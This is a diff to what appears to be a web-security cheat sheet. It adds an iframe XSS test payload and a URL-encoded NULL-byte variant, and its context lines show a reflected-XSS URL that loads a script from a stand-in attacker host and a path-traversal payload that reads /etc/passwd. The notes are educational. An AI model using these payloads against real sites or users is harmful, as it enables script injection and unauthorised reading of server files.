@@ -158,7 +158,12 @@ Reflected XSS is a XSS vulnerability where a webpage displays in its HTML a stri
 (for ex an URL parameter) without validation.  
 This can happen for an error page for example, taking the error message as a parameter.  
 
-Reflected XSS can be exploited by passing a custom script in the URL :
+A common HTML tag used in penetration testing to identify XSS vulnerabilities is : 
+```html
+<iframe src="javascript:alert(`xss`)">
+```
+
+Reflected XSS can be exploited by passing a custom script in the URL and using social engineering to get a user access it :
 ```
 http://vulnerable-website.com?param=<script src="https://attacker-domain.com/payload.js"></script>
 ```
@@ -188,7 +193,7 @@ We can use the **dot-dot-attack** to expose files outside the intended resource 
 #### Bypass a suffix appended to the file name by the web-server
 
 A **NULL-byte injection** can by-pass a mechanism appending a suffix to the file name (like forcing an extension).  
-The NULL byte is represented by `%00` or `0x00`.  
+The NULL byte is represented by `%00` or `0x00` (or `%2500` if URL-encoded).  
 For example if a parameter `file=EN` returns the file `EN.php`, we can use `file=../../../../etc/passwd%00` to ignore the appended `.php`  
 This NULL-byte injection is fixed in PHP 5.3.4.
 
